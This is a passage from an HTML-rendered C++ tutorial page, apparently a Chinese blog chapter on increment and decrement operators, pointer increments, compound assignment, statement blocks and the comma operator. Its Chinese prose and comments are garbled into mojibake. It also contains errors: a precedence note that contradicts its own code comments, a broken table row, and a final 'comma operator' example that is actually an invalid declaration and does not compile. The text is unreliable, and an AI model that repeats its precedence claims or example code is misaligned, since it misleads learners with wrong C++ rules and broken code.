class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨åç¼€è·å–å€¼å¹¶ç§»åŠ¨ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">int</span> val1 = arr[index++]; <span class="comment">// val1 = arr[0] (10), index å˜ä¸º 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val1 = &quot;</span> &lt;&lt; val1 &lt;&lt; <span class="string">&quot;, index = &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨å‰ç¼€ç§»åŠ¨ç´¢å¼•å¹¶è·å–å€¼</span></span><br><span class="line">    index = <span class="number">0</span>; <span class="comment">// é‡ç½® index</span></span><br><span class="line">    <span class="keyword">int</span> val2 = arr[++index]; <span class="comment">// index å…ˆå˜ä¸º 1, val2 = arr[1] (20)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val2 = &quot;</span> &lt;&lt; val2 &lt;&lt; <span class="string">&quot;, index = &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€§èƒ½å»ºè®®:</strong> å¯¹äºå†…ç½®ç±»å‹ï¼ˆå¦‚ <code>int</code>, <code>double</code>, æŒ‡é’ˆï¼‰ï¼Œå‰ç¼€å’Œåç¼€çš„æ€§èƒ½å·®å¼‚é€šå¸¸å¯ä»¥å¿½ç•¥ã€‚ä½†å¯¹äºç”¨æˆ·å®šä¹‰çš„ç±»ç±»å‹ï¼ˆè¿­ä»£å™¨ç­‰ï¼‰ï¼Œ<strong>å‰ç¼€å½¢å¼ (<code>++it</code>) é€šå¸¸æ¯”åç¼€å½¢å¼ (<code>it++</code>) æ•ˆç‡æ›´é«˜</strong>ï¼Œå› ä¸ºåç¼€å½¢å¼éœ€è¦åˆ›å»ºä¸€ä¸ªä¸´æ—¶å¯¹è±¡æ¥ä¿å­˜åŸå§‹å€¼ã€‚å› æ­¤ï¼Œåœ¨ä¸éœ€è¦ä½¿ç”¨åŸå§‹å€¼çš„æƒ…å†µä¸‹ï¼Œå…»æˆä¼˜å…ˆä½¿ç”¨å‰ç¼€é€’å¢/é€’å‡çš„ä¹ æƒ¯æ˜¯å¥½çš„ã€‚</p><h3 id="5-1-8-é€’å¢-é€’å‡è¿ç®—ç¬¦å’ŒæŒ‡é’ˆ"><a href="#5-1-8-é€’å¢-é€’å‡è¿ç®—ç¬¦å’ŒæŒ‡é’ˆ" class="headerlink" title="5.1.8 é€’å¢/é€’å‡è¿ç®—ç¬¦å’ŒæŒ‡é’ˆ"></a>5.1.8 é€’å¢/é€’å‡è¿ç®—ç¬¦å’ŒæŒ‡é’ˆ</h3><p><code>++</code> å’Œ <code>--</code> è¿ç®—ç¬¦å¯ä»¥åº”ç”¨äºæŒ‡é’ˆï¼Œå…¶æ•ˆæœæ˜¯ä½¿æŒ‡é’ˆæŒ‡å‘å†…å­˜ä¸­çš„ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ª<strong>å…ƒç´ </strong>ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ ¹æ®æŒ‡é’ˆæŒ‡å‘çš„æ•°æ®ç±»å‹çš„å¤§å°æ¥è°ƒæ•´åœ°å€ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> arr[<span class="number">3</span>] = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> *ptr = arr; <span class="comment">// ptr æŒ‡å‘ arr[0]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial pointer: &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡å‘ 1.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‰ç¼€é€’å¢æŒ‡é’ˆ</span></span><br><span class="line">    ++ptr; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ++ptr:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡å‘ 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åç¼€é€’å¢æŒ‡é’ˆ</span></span><br><span class="line">    ptr++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ptr++:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡å‘ 3.3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‰ç¼€é€’å‡æŒ‡é’ˆ</span></span><br><span class="line">    --ptr;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After --ptr:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡å‘ 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åç¼€é€’å‡æŒ‡é’ˆ</span></span><br><span class="line">    ptr--;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ptr--:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡å‘ 1.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»“åˆè§£å¼•ç”¨ (æ³¨æ„ä¼˜å…ˆçº§)</span></span><br><span class="line">    ptr = arr; <span class="comment">// é‡ç½®</span></span><br><span class="line">    <span class="keyword">double</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *ptr++ : è·å– ptr å½“å‰æŒ‡å‘çš„å€¼ï¼Œç„¶å ptr æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´  (åç¼€ ++ ä¼˜å…ˆçº§é«˜äº *)</span></span><br><span class="line">    val = *ptr++; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val = *ptr++ : val = &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;, ptr now points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// val=1.1, ptr æŒ‡å‘ 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// *++ptr : ptr å…ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åè·å–æ–°æŒ‡å‘çš„å€¼ (å‰ç¼€ ++ ä¼˜å…ˆçº§é«˜äº *)</span></span><br><span class="line">    ptr = arr; <span class="comment">// é‡ç½®</span></span><br><span class="line">    val = *++ptr;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val = *++ptr : val = &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;, ptr now points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// val=2.2, ptr æŒ‡å‘ 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ++*ptr : è·å– ptr æŒ‡å‘çš„å€¼ï¼Œç„¶åå°†è¯¥å€¼åŠ  1 (è§£å¼•ç”¨ * ä¼˜å…ˆçº§é«˜äºå‰ç¼€ ++)</span></span><br><span class="line">    ptr = arr; <span class="comment">// é‡ç½®</span></span><br><span class="line">    ++*ptr; <span class="comment">// å°† arr[0] çš„å€¼ä» 1.1 å¢åŠ åˆ° 2.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ++*ptr : arr[0] = &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, ptr points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// arr[0]=2.1, ptr æŒ‡å‘ 2.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*ptr)++ : è·å– ptr æŒ‡å‘çš„å€¼ï¼Œç„¶åå°†è¯¥å€¼åŠ  1 (æ‹¬å·å¼ºåˆ¶å…ˆè§£å¼•ç”¨)</span></span><br><span class="line">    ptr = arr; <span class="comment">// é‡ç½®</span></span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1.1</span>; <span class="comment">// æ¢å¤ arr[0]</span></span><br><span class="line">    (*ptr)++; <span class="comment">// å°† arr[0] çš„å€¼ä» 1.1 å¢åŠ åˆ° 2.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After (*ptr)++: arr[0] = &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, ptr points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// arr[0]=2.1, ptr æŒ‡å‘ 2.1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜å…ˆçº§:</strong> è§£å¼•ç”¨ <code>*</code> å’Œå‰/åç¼€ <code>++</code>/<code>--</code> çš„ä¼˜å…ˆçº§ç›¸åŒï¼Œç»“åˆæ€§æ˜¯ä»å³åˆ°å·¦ã€‚ä¸ºäº†æ¸…æ™°èµ·è§ï¼Œå½“ç»“åˆä½¿ç”¨æ—¶ï¼Œä½¿ç”¨æ‹¬å· <code>()</code> æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œä¾‹å¦‚ <code>(*ptr)++</code>ã€‚</p><h3 id="5-1-9-ç»„åˆèµ‹å€¼è¿ç®—ç¬¦"><a href="#5-1-9-ç»„åˆèµ‹å€¼è¿ç®—ç¬¦" class="headerlink" title="5.1.9 ç»„åˆèµ‹å€¼è¿ç®—ç¬¦"></a>5.1.9 ç»„åˆèµ‹å€¼è¿ç®—ç¬¦</h3><p>C++ æä¾›äº†ä¸€ç»„ç»„åˆèµ‹å€¼è¿ç®—ç¬¦ï¼Œå°†ç®—æœ¯è¿ç®—å’Œèµ‹å€¼è¿ç®—åˆå¹¶ä¸ºä¸€ä¸ªè¿ç®—ç¬¦ï¼Œä½¿ä»£ç æ›´ç®€æ´ã€‚</p><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">ç¤ºä¾‹</th><th align="left">ç­‰ä»·äº</th></tr></thead><tbody><tr><td align="left"><code>+=</code></td><td align="left"><code>x += y</code></td><td align="left"><code>x = x + y</code></td></tr><tr><td align="left"><code>-=</code></td><td align="left"><code>x -= y</code></td><td align="left"><code>x = x - y</code></td></tr><tr><td align="left"><code>*=</code></td><td align="left"><code>x *= y</code></td><td align="left"><code>x = x * y</code></td></tr><tr><td align="left"><code>/=</code></td><td align="left"><code>x /= y</code></td><td align="left"><code>x = x / y</code></td></tr><tr><td align="left"><code>%=</code></td><td align="left"><code>x %= y</code></td><td align="left"><code>x = x % y</code></td></tr><tr><td align="left"><code>&amp;=</code></td><td align="left"><code>x &amp;= y</code></td><td align="left"><code>x = x &amp; y</code></td></tr><tr><td align="left">`</td><td align="left">=`</td><td align="left">`x</td></tr><tr><td align="left"><code>^=</code></td><td align="left"><code>x ^= y</code></td><td align="left"><code>x = x ^ y</code></td></tr><tr><td align="left"><code>&lt;&lt;=</code></td><td align="left"><code>x &lt;&lt;= y</code></td><td align="left"><code>x = x &lt;&lt; y</code></td></tr><tr><td align="left"><code>&gt;&gt;=</code></td><td align="left"><code>x &gt;&gt;= y</code></td><td align="left"><code>x = x &gt;&gt; y</code></td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> bonus = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> penalty = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> factor = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    score += bonus; <span class="comment">// score = score + bonus; score å˜ä¸º 110</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after bonus: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score -= penalty; <span class="comment">// score = score - penalty; score å˜ä¸º 105</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after penalty: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score *= factor; <span class="comment">// score = score * factor; score å˜ä¸º 210</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after factor: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score /= <span class="number">3</span>; <span class="comment">// score = score / 3; score å˜ä¸º 70 (æ•´æ•°é™¤æ³•)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after division: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score %= <span class="number">8</span>; <span class="comment">// score = score % 8; score å˜ä¸º 6 (70 é™¤ä»¥ 8 ä½™ 6)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after modulo: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨ for å¾ªç¯æ›´æ–°ä¸­ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        total += i; <span class="comment">// ç´¯åŠ </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total (1-5): &quot;</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 15</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»„åˆèµ‹å€¼è¿ç®—ç¬¦é€šå¸¸æ›´æ˜“è¯»ï¼Œå¹¶ä¸”å¯èƒ½æ¯”åˆ†å¼€å†™ç¨å¾®é«˜æ•ˆä¸€äº›ã€‚</p><h3 id="5-1-10-å¤åˆè¯­å¥ï¼ˆè¯­å¥å—ï¼‰"><a href="#5-1-10-å¤åˆè¯­å¥ï¼ˆè¯­å¥å—ï¼‰" class="headerlink" title="5.1.10 å¤åˆè¯­å¥ï¼ˆè¯­å¥å—ï¼‰"></a>5.1.10 å¤åˆè¯­å¥ï¼ˆè¯­å¥å—ï¼‰</h3><p><strong>å¤åˆè¯­å¥ (Compound Statement)</strong> æˆ– <strong>è¯­å¥å— (Block)</strong> æ˜¯ç”±ä¸€å¯¹èŠ±æ‹¬å· <code>&#123;&#125;</code> æ‹¬èµ·æ¥çš„é›¶æ¡æˆ–å¤šæ¡è¯­å¥ã€‚</p><p><strong>ä½œç”¨:</strong></p><ul><li>  <strong>è¯­æ³•éœ€è¦:</strong> åœ¨ C++ è¯­æ³•è¦æ±‚åªèƒ½å‡ºç°<strong>ä¸€æ¡</strong>è¯­å¥çš„åœ°æ–¹ï¼ˆä¾‹å¦‚ <code>if</code>, <code>else</code>, <code>for</code>, <code>while</code> çš„å¾ªç¯ä½“ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨è¯­å¥å—æ¥åŒ…å«<strong>å¤šæ¡</strong>è¯­å¥ã€‚</li><li>  <strong>åˆ›å»ºä½œç”¨åŸŸ:</strong> è¯­å¥å—ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„**å±€éƒ¨ä½œç”¨åŸŸ (Local Scope)**ã€‚åœ¨å—å†…å£°æ˜çš„å˜é‡ï¼ˆè‡ªåŠ¨å­˜å‚¨å˜é‡ï¼‰åªåœ¨è¯¥å—å†…éƒ¨å¯è§ï¼Œå¹¶åœ¨å—ç»“æŸæ—¶é”€æ¯ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">5</span>) &#123; <span class="comment">// if åé¢éœ€è¦ä¸€æ¡è¯­å¥ï¼Œè¿™é‡Œä½¿ç”¨è¯­å¥å—</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x is greater than 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> y = x * <span class="number">2</span>; <span class="comment">// y åªåœ¨ if å—å†…éƒ¨å¯è§</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Double x is: &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// y åœ¨è¿™é‡Œé”€æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; y; // é”™è¯¯! y åœ¨æ­¤ä½œç”¨åŸŸä¸å¯è§</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop with block:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123; <span class="comment">// for å¾ªç¯ä½“ä½¿ç”¨è¯­å¥å—</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Outer loop i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> j = i + <span class="number">10</span>; <span class="comment">// j åªåœ¨ for å¾ªç¯çš„å½“å‰è¿­ä»£å—å†…å¯è§</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Inner variable j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// æ¯æ¬¡è¿­ä»£ç»“æŸæ—¶ j é”€æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-11-å…¶ä»–è¯­æ³•æŠ€å·§â€”â€”é€—å·è¿ç®—ç¬¦"><a href="#5-1-11-å…¶ä»–è¯­æ³•æŠ€å·§â€”â€”é€—å·è¿ç®—ç¬¦" class="headerlink" title="5.1.11 å…¶ä»–è¯­æ³•æŠ€å·§â€”â€”é€—å·è¿ç®—ç¬¦"></a>5.1.11 å…¶ä»–è¯­æ³•æŠ€å·§â€”â€”é€—å·è¿ç®—ç¬¦</h3><p><strong>é€—å·è¿ç®—ç¬¦ (<code>,</code>)</strong> æ˜¯ C++ ä¸­ä¼˜å…ˆçº§æœ€ä½çš„è¿ç®—ç¬¦ã€‚å®ƒå…è®¸å°†ä¸¤ä¸ªè¡¨è¾¾å¼è¿æ¥æˆä¸€ä¸ªè¡¨è¾¾å¼ã€‚</p><p><strong>è¡Œä¸º:</strong></p><ol><li> å…ˆè®¡ç®—é€—å·å·¦ä¾§çš„è¡¨è¾¾å¼ã€‚</li><li> <strong>ä¸¢å¼ƒ</strong>å·¦ä¾§è¡¨è¾¾å¼çš„è®¡ç®—ç»“æœã€‚</li><li> ç„¶åè®¡ç®—é€—å·å³ä¾§çš„è¡¨è¾¾å¼ã€‚</li><li> æ•´ä¸ªé€—å·è¡¨è¾¾å¼çš„ç»“æœæ˜¯<strong>å³ä¾§è¡¨è¾¾å¼</strong>çš„å€¼å’Œç±»å‹ã€‚</li></ol><p><strong>ä¸»è¦ç”¨é€”:</strong></p><ul><li>  <strong><code>for</code> å¾ªç¯çš„åˆå§‹åŒ–å’Œæ›´æ–°éƒ¨åˆ†:</strong> å…è®¸åœ¨è¿™äº›éƒ¨åˆ†æ‰§è¡Œå¤šä¸ªæ“ä½œï¼Œè€Œä¸éœ€è¦è¯­å¥å—ã€‚</li><li>  (è¾ƒå°‘è§) åœ¨éœ€è¦å•ä¸ªè¡¨è¾¾å¼çš„åœ°æ–¹æ‰§è¡Œå¤šä¸ªæœ‰å‰¯ä½œç”¨çš„æ“ä½œã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åœ¨ for å¾ªç¯ä¸­ä½¿ç”¨é€—å·è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using comma in for loop:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">10</span>; <span class="comment">// åˆå§‹åŒ–: åˆå§‹åŒ– i å’Œ j</span></span><br><span class="line">         i &lt; j;         <span class="comment">// æ¡ä»¶</span></span><br><span class="line">         ++i, --j)      <span class="comment">// æ›´æ–°: é€’å¢ i, é€’å‡ j</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€—å·è¡¨è¾¾å¼çš„å€¼</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> result = (x = <span class="number">5</span>, x + <span class="number">10</span>); <span class="comment">// x å…ˆè¢«èµ‹å€¼ä¸º 5, ç„¶åè®¡ç®— x+10 (15)</span></span><br><span class="line">                                  <span class="comment">// æ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæ˜¯ 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of comma expression: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x after comma expression: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¼˜å…ˆçº§æœ€ä½</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> value = a++, b += a, c += b; <span class="comment">// é€—å·ä¼˜å…ˆçº§ä½äºèµ‹å€¼</span></span><br><span class="line">    <span class="comment">// è¿™å®é™…ä¸Šç­‰ä»·äº: value = a++; (value=1, a=2) ç„¶åè®¡ç®— b+=a (b=2+2=4), ç„¶åè®¡ç®— c+=b (c=3+4=7)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, a=&quot;</span> &lt;&lt; a &lt;&lt; 